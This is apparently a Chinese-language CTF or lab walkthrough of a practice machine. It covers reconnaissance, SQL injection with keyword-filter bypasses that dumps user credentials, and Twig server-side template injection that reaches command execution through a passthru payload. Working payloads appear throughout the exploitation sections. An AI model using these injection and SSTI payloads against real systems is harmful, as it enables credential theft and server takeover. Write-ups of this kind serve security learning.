一、信息收集

首先使用 Nmap 对目标主机进行扫描：

nmap -sC -sV -p- target_ip

扫描结果显示：

![nmap](image.png)

22/tcp  open  ssh
80/tcp  open  http

说明目标主机提供 Web 服务。

访问 http://target_ip 后进入首页，并对页面进行初步分析。


二、Web 信息枚举
1 页面源代码分析

查看页面源代码后发现：

注释中泄露了一个账户信息

提示存在 mail.log 文件

这些信息可能在后续利用中发挥作用。

2 技术识别

使用 Wappalyzer 识别网站技术栈：

发现：

Apache 2.4

虽然该版本存在公开漏洞，但经过验证后发现：

无法直接利用（Rabbit Hole）

3 目录扫描

使用 Gobuster 进行目录扫描：

gobuster dir -u http://target_ip -w /usr/share/seclists/Discovery/Web-Content/common.txt

发现关键路径：

/mail.log
/composer.json
/phpmyadmin

分析结果：

文件	作用
mail.log	可能包含登录信息
composer.json	暴露网站使用的组件
phpmyadmin	数据库管理入口
三、漏洞发现
1 Twig 模板引擎识别

打开 composer.json 文件发现：

Twig 2.14.0

说明网站使用 Twig 模板引擎。

Twig 历史上存在 SSTI 漏洞利用方式。

四、SQL注入漏洞利用
1 登录页面测试

登录页面存在两个输入框：

email
password

尝试基础 SQL 注入：

' OR 1=1-- -

结果：

页面弹出提示，且请求未发送。

说明：

客户端存在 JavaScript 过滤。

2 客户端过滤绕过

查看 JS 代码发现过滤逻辑：

过滤关键字：

OR
AND
SELECT
'
"

绕过方式：

使用 Burp Suite 拦截请求并修改 payload。

测试 payload：

a' || 1=1-- -

成功绕过客户端过滤。

3 服务器端过滤分析

即使绕过客户端过滤仍无法登录，说明：

服务器端也存在过滤。

继续尝试不同 payload。

最终发现：

|| 可以替代 OR

成功绕过过滤并登录。

五、SQL注入点发现

登录后进入编辑页面。

请求参数如下：

rank
country
gold
silver
bronze

测试发现：

gold/silver/bronze 只接受数字

country 可以接受字符串

推测 SQL 查询：

UPDATE table SET gold=?, country=?, silver=?, bronze=? WHERE rank=?

六、SQL注入验证

构造测试 payload：

gold=555 WHERE rank=3;-- -

提交后数据被修改。

说明：

SQL注入成立。

七、数据库枚举

使用 country 字段进行信息泄露。

枚举数据库

Payload：

gold=1,country=(SELECT group_concat(schema_name) from information_schema.schemata)

发现关键字被过滤。

过滤绕过

发现过滤方式：

SELECT
OR
AND

尝试绕过：

seSELECTlect
infoORrmation_schema

成功绕过过滤。

获取数据库
gold=1,country=(seSELECTlect group_concat(schema_name) from infoORrmation_schema.schemata)

得到：

bac_test
枚举表
gold=1,country=(seSELECTlect group_concat(table_name) from infoORrmation_schema.tables WHERE table_schema='bac_test')

得到：

users
枚举字段
gold=1,country=(seSELECTlect group_concat(column_name) from infoORrmation_schema.columns WHERE table_name='users')

得到：

email
password
获取账户密码
gold=1,country=(seSELECTlect group_concat(email,':',passwoORrd) from bac_test.users)

成功获取管理员账户密码。

八、管理员登录

使用获得的管理员账号登录后台。

登录后发现：

Profile 页面

该页面存在可控输入点。

九、SSTI 漏洞利用

测试模板注入：

{{8*8}}

返回：

64

确认：

存在 SSTI 漏洞。

并确认模板引擎为：

Twig
十、SSTI 利用

测试常见 payload：

{{ system('id') }}

失败。

说明：

system 被禁用。

继续测试：

{{['id',1]|sort('passthru')|join}}

成功执行命令：

id

进一步执行：

ls

找到 flag 文件。

十一、总结

本靶机涉及漏洞：

SQL Injection

SSTI

关键字过滤绕过

经验总结

目录扫描非常重要
本次由于未扫描 .log 和 .json 文件，差点错过关键线索。

每个页面源码都必须检查

很多提示隐藏在 HTML 注释中。

SQL 注入不应完全依赖 sqlmap

手动测试可以：

分析过滤逻辑

推断 SQL 语句

实现绕过

SSTI 利用需要尝试不同函数

常见函数：

system
exec
shell_exec
passthru
popen
